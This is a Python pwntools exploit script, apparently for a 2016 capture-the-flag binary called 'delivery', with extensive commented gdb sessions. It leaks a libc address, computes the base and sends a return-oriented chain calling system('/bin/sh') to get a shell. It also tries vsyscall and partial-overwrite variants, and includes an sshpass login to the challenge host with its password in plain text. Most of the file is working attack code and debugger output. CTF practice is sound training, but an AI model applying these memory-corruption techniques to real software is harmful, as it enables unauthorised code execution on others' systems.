#!/usr/bin/env python
from pwn import *
import IPython

#p = process(['sh', '-c' './delivery 1>&2'])
p = process(['./delivery']) if '--live' not in sys.argv else process(['sshpass', '-p', 'delivery', 'ssh', 'delivery@delivery.as.a.service.marcusmadisonbakery.ctf'])
#p = process(['./a.out'])

def force_flush():
    '''
    The delivery binary doesn't flush its stdout, this is a hacky 
    workaround that 'plunges' the buffer until data is visible.
    '''
    buf = []
    s = 'Invalid option.'
    tmp = None
    while True:
        tmp = p.recvuntil([s], timeout=.001)
        if s in tmp:
            buf.append(tmp)
            break
        #print('test')
        p.sendline('')
    oldtmp = None
    while True:
        tmp = p.recvuntil([s], timeout=.001)
        buf.append(tmp)
        if s not in tmp:
            return buf
        oldtmp = tmp

#print(p.recvuntil(['Your option:']))
'''
for i in range(101):
    print(i)
    p.sendline('2')
    p.sendline('hello')
    tmp = force_flush()
    print(repr(tmp))

p.sendline('1')
print(repr(force_flush()))

p.sendline('3')
'''

'''
p.sendline('3')
p.sendline('101')
p.sendline('A'*24+'B'*4)
print(repr(force_flush()))
'''
#'AAAAAAAAAAAAAAAAAAAAAAAABBBB'

'''
0x00400adc: popq %r12; popq %r13; popq %r14; popq %r15; retq;
0x00400add: popq %rsp; popq %r13; popq %r14; popq %r15; retq;
0x00400adf: popq %rbp; popq %r14; popq %r15; retq;
0x00400ae1: popq %rsi; popq %r15; retq;
0x00400ae3: popq %rdi; retq;
-----
  400591:       c3                      retq 
-----
afn sub.get_input @ 0x0040072d
-----
0x00400791: popq %rbp; retq;
0x004007a1: popq %rbp; retq;
-----
0x0000000000400680 : mov rbp, rsp ; ja 0x40068d ; pop rbp ; ret
0x000000000040058d : add rsp, 8 ; ret
-----
#define __NR_time 201
   0xffffffffff600400:  mov    $0xc9,%rax
   0xffffffffff600407:  syscall 
   0xffffffffff600409:  retq   
---
#define __NR_getcpu 309
   0xffffffffff600800:  mov    $0x135,%rax
   0xffffffffff600807:  syscall 
   0xffffffffff600809:  retq  
'''

def emit_call(addr, arg1, arg2):
    rdi_ret = p64(0x00400ae3)
    rsi_r15_ret = p64(0x00400ae1)
    return ''.join([rdi_ret, p64(arg1), rsi_r15_ret, p64(arg2), p64(0), p64(addr)])

#gdb.attach(p)

def attempt_nops():
    retnop = 0xffffffffff600809

    for i in range(0,100):
        p.sendline('3')
        p.sendline(str(i+1))
        p.sendline(p64(retnop)*127 + p64(0x0a400640))
        #print(repr(force_flush()[0]))
        if i % 10 == 0:
            print(i)

    p.sendline('1')
    print(repr(force_flush()))

    p.sendline('3')
    p.sendline(str(101))
    p.sendline(p64(retnop)*3 + p64(0x0a400640))
    print(repr(force_flush()[0]))
    p.sendline('4')

'''
for i in range(5):
    attempt_nops()
'''

def attempt_partial_overwrite():
    ''' delivery3_d80a3845c08b0241cb9ee40992be2ae2d1293c57 '''
    p.sendline('3')
    p.sendline(str(101))
    addr = 0x0004652c
    #addr = 0x00046533
    #p.sendline('A'*8*3+'\x33\x65\x04')
    #addr = 0x000e58c5
    #p.sendline('A'*8*3+'\xc4\x58\x0e')
    #addr = 0x000e4d38
    #p.sendline('A'*8*3+'\x38\x4d\x0e')

    # derandomized my host for testing:
    # sudo sh -c 'echo 0 > /proc/sys/kernel/randomize_va_space'
    #>>> hex(0x00007ffff7c34000+0x000e4d38)
    #'0x7ffff7d18d38'
    '''
    Program received signal SIGSEGV, Segmentation fault.
    0x00007ffff7d18d38 in ?? ()
    (gdb) x/5i $rip
    => 0x7ffff7d18d38:  Cannot access memory at address 0x7ffff7d18d38
    (gdb) info proc mappings
    process 21103
    Mapped address spaces:

              Start Addr           End Addr       Size     Offset objfile
                0x400000           0x402000     0x2000        0x0 /home/avi/Documents/nsec_2016_05/delivery
                0x601000           0x602000     0x1000     0x1000 /home/avi/Documents/nsec_2016_05/delivery
                0x602000           0x603000     0x1000     0x2000 /home/avi/Documents/nsec_2016_05/delivery
          0x7ffff7a17000     0x7ffff7bd2000   0x1bb000        0x0 /home/avi/Documents/nsec_2016_05/libc.so.6
          0x7ffff7bd2000     0x7ffff7dd1000   0x1ff000   0x1bb000 /home/avi/Documents/nsec_2016_05/libc.so.6
          0x7ffff7dd1000     0x7ffff7dd5000     0x4000   0x1ba000 /home/avi/Documents/nsec_2016_05/libc.so.6
          0x7ffff7dd5000     0x7ffff7dd7000     0x2000   0x1be000 /home/avi/Documents/nsec_2016_05/libc.so.6
          0x7ffff7dd7000     0x7ffff7ddc000     0x5000        0x0 
          0x7ffff7ddc000     0x7ffff7dfc000    0x20000        0x0 /lib/x86_64-linux-gnu/ld-2.19.so
          0x7ffff7ff1000     0x7ffff7ff8000     0x7000        0x0 
          0x7ffff7ff8000     0x7ffff7ffa000     0x2000        0x0 [vdso]
    ---Type <return> to continue, or q <return> to quit---
          0x7ffff7ffa000     0x7ffff7ffc000     0x2000        0x0 [vvar]
          0x7ffff7ffc000     0x7ffff7ffd000     0x1000    0x20000 /lib/x86_64-linux-gnu/ld-2.19.so
          0x7ffff7ffd000     0x7ffff7ffe000     0x1000    0x21000 /lib/x86_64-linux-gnu/ld-2.19.so
          0x7ffff7ffe000     0x7ffff7fff000     0x1000        0x0 
          0x7ffffffde000     0x7ffffffff000    0x21000        0x0 [stack]
      0xffffffffff600000 0xffffffffff601000     0x1000        0x0 [vsyscall]
    (gdb) x/10i 0x7ffff7a17000+0x7ffff7a17000
       0xffffef42e000:  Cannot access memory at address 0xffffef42e000
    (gdb) x/10i 0x7ffff7a17000+0x000e4d38
       0x7ffff7afbd38:  lea    0x97f9c(%rip),%rdi        # 0x7ffff7b93cdb
       0x7ffff7afbd3f:  lea    0x16(,%rdx,8),%rdx
       0x7ffff7afbd47:  and    $0xfffffffffffffff0,%rdx
       0x7ffff7afbd4b:  sub    %rdx,%rsp
       0x7ffff7afbd4e:  lea    0x7(%rsp),%rdx
       0x7ffff7afbd53:  shr    $0x3,%rdx
       0x7ffff7afbd57:  cmp    $0x1,%eax
       0x7ffff7afbd5a:  lea    0x0(,%rdx,8),%rsi
       0x7ffff7afbd62:  mov    %rdi,0x0(,%rdx,8)
       0x7ffff7afbd6a:  mov    %rcx,0x8(,%rdx,8)
    (gdb) x/s 0x7ffff7b93cdb
    0x7ffff7b93cdb: "/bin/sh"
    (gdb) i r rip
    rip            0x7ffff7d18d38   0x7ffff7d18d38
    '''
    #>>> hex(0x7ffff7d18d38 - (0x7ffff7a17000+0x000e4d38))
    #'0x21d000'
    #>>> hex(0x7ffff7a17000+0x000e4d38)
    #'0x7ffff7afbd38'
    #p.sendline('A'*8*3+'\x38\xbd\xaf')
    #addr = 0x000e4ac8
    vsyscall_end = 0xffffffffff601000
    #p.sendline('A'*8*3+p64(0x7ffff7a17000+addr)[:3])
    #>>> hex(0x7ffff7a17000+0x000e4ac8)
    #'0x7ffff7afbac8'
    #p.sendline(p64(vsyscall_end-0x101)*3+p64(0x7ffff7a17000+addr)[:3])
    '''
    (gdb) b *0x7ffff7afba7d
    Breakpoint 1 at 0x7ffff7afba7d
    (gdb) c
    Continuing.

    Breakpoint 1, 0x00007ffff7afba7d in ?? ()
       from /home/avi/Documents/nsec_2016_05/libc.so.6
    (gdb) x/i $rip
    => 0x7ffff7afba7d:  callq  0x7ffff7ad8330 <execve>
    (gdb) i r
    rax            0x0  0
    rbx            0x0  0
    rcx            0x0  0
    rdx            0xcccccccccccccccc   -3689348814741910324
    rsi            0x7ffff7ff1024   140737354076196
    rdi            0x7ffff7b93cdb   140737349500123
    rbp            0xffffffffff600eff   0xffffffffff600eff
    rsp            0x7fffffffdc90   0x7fffffffdc90
    r8             0x7ffff7ff1024   140737354076196
    r9             0x0  0
    r10            0x2  2
    r11            0xfffffff5   4294967285
    r12            0x400640 4195904
    r13            0x7fffffffdd60   140737488346464
    r14            0x0  0
    r15            0x0  0
    rip            0x7ffff7afba7d   0x7ffff7afba7d
    eflags         0x202    [ IF ]
    cs             0x33 51
    ss             0x2b 43
    ds             0x0  0
    es             0x0  0
    fs             0x0  0
    ---Type <return> to continue, or q <return> to quit---
    gs             0x0  0
    (gdb) x/s $rdi
    0x7ffff7b93cdb: "/bin/sh"
    (gdb) x/wx $rsi
    0x7ffff7ff1024: 0x00000000
    (gdb) x/wx $rdx
    0xcccccccccccccccc: Cannot access memory at address 0xcccccccccccccccc
    (gdb) nexti
    0x00007ffff7afba82 in ?? () from /home/avi/Documents/nsec_2016_05/libc.so.6
    (gdb) i r rax
    rax            0xffffffffffffffff   -1
    '''
    #addr = 0x000c1cf3
    '''
    (gdb) b *0x7ffff7a17000+0x000c1cf3
    Breakpoint 1 at 0x7ffff7ad8cf3
    (gdb) c
    Continuing.

    Breakpoint 1, 0x00007ffff7ad8cf3 in execvpe ()
       from /home/avi/Documents/nsec_2016_05/libc.so.6
    (gdb) x/5i $rip
    => 0x7ffff7ad8cf3 <execvpe+931>:    
        lea    0xbafe1(%rip),%rdi        # 0x7ffff7b93cdb
       0x7ffff7ad8cfa <execvpe+938>:    jmpq   0x7ffff7ad8a77 <execvpe+295>
       0x7ffff7ad8cff <execvpe+943>:    xor    %edx,%edx
       0x7ffff7ad8d01 <execvpe+945>:    xor    %esi,%esi
       0x7ffff7ad8d03 <execvpe+947>:    xor    %edi,%edi
    (gdb) nexti 2
    0x00007ffff7ad8a77 in execvpe ()
       from /home/avi/Documents/nsec_2016_05/libc.so.6
    (gdb) x/5i $rip
    => 0x7ffff7ad8a77 <execvpe+295>:    mov    %r12,%rdx
       0x7ffff7ad8a7a <execvpe+298>:    callq  0x7ffff7ad8330 <execve>
       0x7ffff7ad8a7f <execvpe+303>:    mov    %r13,%rdi
       0x7ffff7ad8a82 <execvpe+306>:    callq  0x7ffff7a36470 <free@plt+48>
       0x7ffff7ad8a87 <execvpe+311>:    jmpq   0x7ffff7ad899d <execvpe+77>
    (gdb) nexti
    0x00007ffff7ad8a7a in execvpe ()
       from /home/avi/Documents/nsec_2016_05/libc.so.6
    (gdb) x/5i $rip
    => 0x7ffff7ad8a7a <execvpe+298>:    callq  0x7ffff7ad8330 <execve>
       0x7ffff7ad8a7f <execvpe+303>:    mov    %r13,%rdi
       0x7ffff7ad8a82 <execvpe+306>:    callq  0x7ffff7a36470 <free@plt+48>
       0x7ffff7ad8a87 <execvpe+311>:    jmpq   0x7ffff7ad899d <execvpe+77>
       0x7ffff7ad8a8c <execvpe+316>:    nopl   0x0(%rax)
    (gdb) i r rdi rsi rdx
    rdi            0x7ffff7b93cdb   140737349500123
    rsi            0x7ffff7ff1024   140737354076196
    rdx            0x400640 4195904
    (gdb) nexti
    0x00007ffff7ad8a7f in execvpe ()
       from /home/avi/Documents/nsec_2016_05/libc.so.6
    (gdb) i r eax
    eax            0xffffffff   -1
    '''
    p.sendline(p64(vsyscall_end-0x101)*3+p64(0x7ffff7a17000+addr)[:3])

    p.sendline('4')
    tmp = None
    try:
        tmp = p.recv(timeout=5)
        print(repr(tmp))
    except EOFError:
        print('Segfaulted, probably')
        return
    print(repr(tmp))
    p.interactive()

'''
i=0
if True:
#for i in range(1024*8):
    print('Attempt %d:' % (i,))
    p = process(['./delivery']) if '--live' not in sys.argv else process(['sshpass', '-p', 'delivery', 'ssh', 'delivery@delivery.as.a.service.marcusmadisonbakery.ctf'])
    gdb.attach(p)
    attempt_partial_overwrite()
'''

def get_leak():
    ''' delivery4_f62a7f48d634f6a8fc83df2473907d4162a2af08 '''
    for i in range(0,101):
        p.sendline('3')
        p.sendline(str(i+1))
        p.sendline('A'*4)
        tmp = force_flush()
        #print(repr(tmp[0]))
        if i % 10 == 0:
            print(i)

    p.sendline('3')
    p.sendline(str(102))
    p.sendline('A'*8*2+'B'*4)
    p.sendline('1')

    #0x0000000000400b13 : pop rdi ; ret
    '''
    [0x000c1745]> f~start_main
    0x00021dd0 447 sym.__libc_start_main
    [0x000c1745]> f~sym.system
    0x00046640 45 sym.system
    [0x000c1745]> f~str._bin
    0x0017ccdb 8 str._bin_sh
    0x0017e58f 14 str._bin:_usr_bin
    0x0017ea69 9 str._bin_csh
    '''

    #tmp = force_flush()
    #print(repr(tmp))
    #print(repr(tmp[0]))

    p.sendline('1')
    has_libcleak = force_flush()
    print(repr(has_libcleak[0]))

    libc_start_main = int(re.findall('Order no: 102\n-*\nAAAAAAAAAAAAAAAABBBB([^\n]*)\n', has_libcleak[0])[0][::-1].encode('hex'), 16)
    '''
    tmp1 = has_libcleak[0]
    print('tmp1: %r' % (tmp1,))
    tmp2 = re.findall('Order no: 102\n-*\nAAAAAAAAAAAAAAAABBBB([^\n]*)\n', tmp1)
    print('tmp2: %r' % (tmp2,))
    tmp3 = tmp2[0][::-1].encode('hex')
    print('tmp3: %r' % (tmp3,))
    tmp4 = int(tmp3, 16)
    print('tmp4: %r' % (tmp4,))
    '''
    rdi_ret = 0x0000000000400b13
    libc_base = libc_start_main - 0x00021dd0
    libc_system = libc_base + 0x00046640
    libc_binsh = libc_base + 0x0017ccdb
    # b* 0x00400aa4

    gdb.attach(p)
    # ropchain doesn't work in delivery4_f62a7f48d634f6a8fc83df2473907d4162a2af08 
    # because memcpy(dst, src, strlen(src)) still can't write nulls
    '''
(gdb) b*0x0040098e
Breakpoint 1 at 0x40098e
(gdb) c
Continuing.

Breakpoint 1, 0x000000000040098e in update_order ()
(gdb) i r
rax            0x7fff5a6bb0b4   140734710395060
rbx            0x0  0
rcx            0x7fff5a6a1870   140734710290544
rdx            0x16 22
rsi            0x7fff5a6a1870   140734710290544
rdi            0x7fff5a6bb0b4   140734710395060
rbp            0x7fff5a6a1c80   0x7fff5a6a1c80
rsp            0x7fff5a6a1870   0x7fff5a6a1870
r8             0xec0c   60428
r9             0x400b134242 275063718466
r10            0x7fd364c16dd00000   9210816444836610048
r11            0xffffffef   4294967279
r12            0x400650 4195920
r13            0x7fff5a6bb1a0   140734710395296
r14            0x0  0
r15            0x0  0
rip            0x40098e 0x40098e <update_order+154>
eflags         0x202    [ IF ]
cs             0x33 51
ss             0x2b 43
ds             0x0  0
es             0x0  0
fs             0x0  0
---Type <return> to continue, or q <return> to quit---
gs             0x0  0
(gdb) x/32wx $rdi
0x7fff5a6bb0b4: 0x41414141  0x41414141  0x41414141  0x41414141
0x7fff5a6bb0c4: 0x42424242  0x64abbec5  0x00007fd3  0x00000000
0x7fff5a6bb0d4: 0x00000000  0x5a6bb1a8  0x00007fff  0x00000000
0x7fff5a6bb0e4: 0x00000001  0x00400a0f  0x00000000  0x00000000
0x7fff5a6bb0f4: 0x00000000  0x9f8e569e  0xe5115da5  0x00400650
0x7fff5a6bb104: 0x00000000  0x5a6bb1a0  0x00007fff  0x00000000
0x7fff5a6bb114: 0x00000000  0x00000000  0x00000000  0xfe2e569e
0x7fff5a6bb124: 0x1aefe972  0xe374569e  0x1ab794f2  0x00000000
(gdb) x/32wx $rsi
0x7fff5a6a1870: 0x41414141  0x41414141  0x41414141  0x41414141
0x7fff5a6a1880: 0x42424242  0x00000b13  0x00000000  0x64c16dd0
0x7fff5a6a1890: 0x00007fd3  0x64ae0735  0x00007fd3  0x0000000a
0x7fff5a6a18a0: 0x00000000  0x00000000  0x00000000  0x00000000
0x7fff5a6a18b0: 0x00000000  0x00000000  0x00000000  0x00000000
0x7fff5a6a18c0: 0x00000000  0x00000000  0x00000000  0x00000000
0x7fff5a6a18d0: 0x00000000  0x00000000  0x00000000  0x00000000
0x7fff5a6a18e0: 0x00000000  0x00000000  0x00000000  0x00000000
(gdb) nexti
0x0000000000400993 in update_order ()
(gdb) x/32wx $rdi
0x7fff5a6bb0b4: 0x41414141  0x41414141  0x41414141  0x41414141
0x7fff5a6bb0c4: 0x42424242  0x64ab0b13  0x00007fd3  0x00000000
0x7fff5a6bb0d4: 0x00000000  0x5a6bb1a8  0x00007fff  0x00000000
0x7fff5a6bb0e4: 0x00000001  0x00400a0f  0x00000000  0x00000000
0x7fff5a6bb0f4: 0x00000000  0x9f8e569e  0xe5115da5  0x00400650
0x7fff5a6bb104: 0x00000000  0x5a6bb1a0  0x00007fff  0x00000000
0x7fff5a6bb114: 0x00000000  0x00000000  0x00000000  0xfe2e569e
0x7fff5a6bb124: 0x1aefe972  0xe374569e  0x1ab794f2  0x00000000
(gdb) x/32wx $rsi
0x7fff5a6a1870: 0x41414141  0x41414141  0x41414141  0x41414141
0x7fff5a6a1880: 0x42424242  0x00000b13  0x00000000  0x64c16dd0
0x7fff5a6a1890: 0x00007fd3  0x64ae0735  0x00007fd3  0x0000000a
0x7fff5a6a18a0: 0x00000000  0x00000000  0x00000000  0x00000000
0x7fff5a6a18b0: 0x00000000  0x00000000  0x00000000  0x00000000
0x7fff5a6a18c0: 0x00000000  0x00000000  0x00000000  0x00000000
0x7fff5a6a18d0: 0x00000000  0x00000000  0x00000000  0x00000000
0x7fff5a6a18e0: 0x00000000  0x00000000  0x00000000  0x00000000
(gdb) i r rdx
rdx            0x16 22
    '''
    p.sendline('3')
    p.sendline(str(102))
    ropchain = 'A'*8*2+'B'*4 + p64(rdi_ret) + p64(libc_binsh) + p64(libc_system)
    print(repr(ropchain))
    p.sendline(ropchain)
    p.sendline('4')

#gdb.attach(p)
get_leak()
p.interactive()


"""
p.sendline('3')
p.sendline('101')
p.sendline("A"*8*3+p64(0x0a414141))
p.sendline('4')

leaks = []
#for (x, addr) in enumerate([0x0a400640+delta for delta in [0,2,5,6,9,0xd,0xe,0xf,0x16]]+[0x0a4009f3]):
premains = [0x0a400640+delta for delta in [0,2,5,6,9,0xd,0xe,0xf,0x16]]
mains = [0x0a4009f3+delta for delta in [0,1,4,0xb]]
#addresses = [premains[0]] + [mains[0]] + [premains[1]] + [mains[1]] + [premains[2]] + [mains[2]]
#addresses = [mains[0]] + [premains[0]] + [mains[1]] + premains[0:2] + [mains[0]]
addresses = [premains[0]]*10
for (x, addr) in enumerate(addresses):
    p.sendline('3')
    p.sendline('101')
    #p.sendline("A"*8*3+p64(0x0a40064d+1))
    #p.sendline("A"*8*3+p64(0x0a4009f4))
    #p.sendline("A"*8*3+p64(0x0a400656))
    #p.sendline("A"*8*3+p64(0x0a400770))
    #p.sendline("A"*8*3+p64(0x0a400640+delta))
    p.sendline("A"*8*3+p64(addr))
    p.sendline('4')

    if x < 3:
        p.sendline('3')
        p.sendline(str(-2))
        p.sendline("A"*8*119+p64(premains[0]))
        tmp = force_flush()
        #print(repr(tmp[0]))


    for i in range(0,100):
        p.sendline('3')
        p.sendline(str(i+1))
        p.sendline('A'*1023)
        tmp = force_flush()
        #print(repr(tmp[0]))
        if i % 10 == 0:
            print(x,i)

    for i in range(101,104):
        print(i)
        p.sendline('3')
        p.sendline(str(i+1))
        p.sendline('A'*1023)
        tmp = force_flush()
        #print(repr(tmp[0]))
        if i % 10 == 0:
            print(x,i)

    '''
    p.sendline('3')
    p.sendline(str(101))
    p.sendline('B'*8*3)
    print(repr(force_flush()[0]))
    '''

    '''
    x/a 0x602080
    x/4096wx *((long*)0x602080)
    x/4wx 100*0x400+*((long*)0x602080)
    x/a 100*0x400+*((long*)0x602080)
    b *0x00400972
    b *0x00400a74
    '''
    #gdb.attach(p)

    p.sendline('1')
    has_stackleak = force_flush()[0]
    print(repr(has_stackleak))
    #stackleak = int(re.findall('Order no: 101\n-*\n([^\n]*)\n', has_stackleak)[0][::-1].encode('hex'), 16)
    stackleak = [int(x[::-1].encode('hex'), 16) for x in re.findall('Order no: 101\n-*\n([^\n]*)\n', has_stackleak)]
    # Order no: 101\n-------------------------------------\n\xf0\x80/y\xfc\x7f
    print(stackleak)
    leaks.append(stackleak)

print(leaks)
"""

"""
buf100 = stackleak - 0xf0
buf0 = buf100 - 100 * 1024
offset_to_pbuf = (0x602080 - buf0)/1024
#offset_to_pbuf = (buf0 - 0x602080)/1024
print('buf0: 0x%x' % (buf0,))
print('offset_to_pbuf: %d' % (offset_to_pbuf,))

p.sendline('3')
p.sendline('101')
bees = 'B'*8
cees = 'C'*8
get_input = p64(0x0040072d)
print('get_input: ' + repr(get_input))
p.sendline('A'*8*3+'B'*8)
#p.sendline('A'*8*3+p64(0x000000000a400610))
#p.sendline('A'*8*3+p64(0x000000000a40072d))
#p.sendline(p64(stackleak)*3+get_input+bees+cees*20)
#p.sendline('A'*8*4+get_input+bees+cees*20)

# b *0x40072d
#gdb.attach(p)
#p.sendline('A'*8*3+'-\x07@\x00'+'C'*4)

p.sendline('4')
"""
'''
p.sendline('3')
p.sendline(str(offset_to_pbuf+1))
p.sendline('A'*8)
#p.sendline(p64(0x602000))
'''

'''
p.sendline('3')
p.sendline('101')
rbp_ret = 0x00400791
main = 0x004009f3
p.sendline(p64(rbp_ret) + p64(0x602090) + p64(main))
'''

#p.interactive()

#IPython.embed()
#p.interactive()
# (for i in $(seq 1 100); do echo 3; echo $i; echo 'hello'; done && cat) | ./delivery

'''
(gdb) x/32wx 0x7ffffffe4c90+1024*100
0x7fffffffdc90: 0xffffdd80      0x00007fff      0x00000000      0x00000000
0x7fffffffdca0: 0x00000000      0x00000000      0xf7a52b45      0x00007fff
0x7fffffffdcb0: 0x00000000      0x00000000      0xffffdd88      0x00007fff
0x7fffffffdcc0: 0x00000000      0x00000001      0x004009f3      0x00000000
0x7fffffffdcd0: 0x00000000      0x00000000      0xe4beec23      0xe1945ddc
0x7fffffffdce0: 0x00400640      0x00000000      0xffffdd80      0x00007fff
0x7fffffffdcf0: 0x00000000      0x00000000      0x00000000      0x00000000
0x7fffffffdd00: 0x5ddeec23      0x1e6ba223      0xb144ec23      0x1e6bb296
(gdb) info proc mappings
process 14022
Mapped address spaces:

          Start Addr           End Addr       Size     Offset objfile
            0x400000           0x402000     0x2000        0x0 /home/avi/Documents/nsec_2016_05/delivery
            0x601000           0x602000     0x1000     0x1000 /home/avi/Documents/nsec_2016_05/delivery
            0x602000           0x603000     0x1000     0x2000 /home/avi/Documents/nsec_2016_05/delivery
      0x7ffff7a31000     0x7ffff7bd3000   0x1a2000        0x0 /lib/x86_64-linux-gnu/libc-2.19.so
      0x7ffff7bd3000     0x7ffff7dd2000   0x1ff000   0x1a2000 /lib/x86_64-linux-gnu/libc-2.19.so
      0x7ffff7dd2000     0x7ffff7dd6000     0x4000   0x1a1000 /lib/x86_64-linux-gnu/libc-2.19.so
      0x7ffff7dd6000     0x7ffff7dd8000     0x2000   0x1a5000 /lib/x86_64-linux-gnu/libc-2.19.so
      0x7ffff7dd8000     0x7ffff7ddc000     0x4000        0x0 
      0x7ffff7ddc000     0x7ffff7dfc000    0x20000        0x0 /lib/x86_64-linux-gnu/ld-2.19.so
      0x7ffff7fd3000     0x7ffff7fd6000     0x3000        0x0 
      0x7ffff7ff4000     0x7ffff7ff8000     0x4000        0x0 
      0x7ffff7ff8000     0x7ffff7ffa000     0x2000        0x0 [vdso]
      0x7ffff7ffa000     0x7ffff7ffc000     0x2000        0x0 [vvar]
      0x7ffff7ffc000     0x7ffff7ffd000     0x1000    0x20000 /lib/x86_64-linux-gnu/ld-2.19.so
      0x7ffff7ffd000     0x7ffff7ffe000     0x1000    0x21000 /lib/x86_64-linux-gnu/ld-2.19.so
      0x7ffff7ffe000     0x7ffff7fff000     0x1000        0x0 
      0x7ffffffde000     0x7ffffffff000    0x21000        0x0 [stack]
  0xffffffffff600000 0xffffffffff601000     0x1000        0x0 [vsyscall]
(gdb) x/32a 0x7ffffffe4c90+1024*100
0x7fffffffdc90: 0x7fffffffdd80  0x0
0x7fffffffdca0: 0x0     0x7ffff7a52b45 <__libc_start_main+245>
0x7fffffffdcb0: 0x0     0x7fffffffdd88
0x7fffffffdcc0: 0x100000000     0x4009f3
0x7fffffffdcd0: 0x0     0xe1945ddce4beec23
0x7fffffffdce0: 0x400640        0x7fffffffdd80
0x7fffffffdcf0: 0x0     0x0
0x7fffffffdd00: 0x1e6ba2235ddeec23      0x1e6bb296b144ec23
0x7fffffffdd10: 0x0     0x0
0x7fffffffdd20: 0x0     0x400a80
0x7fffffffdd30: 0x7fffffffdd88  0x1
0x7fffffffdd40: 0x0     0x0
0x7fffffffdd50: 0x400640        0x7fffffffdd80
0x7fffffffdd60: 0x0     0x400669
0x7fffffffdd70: 0x7fffffffdd78  0x1c
0x7fffffffdd80: 0x1     0x7fffffffe050
'''
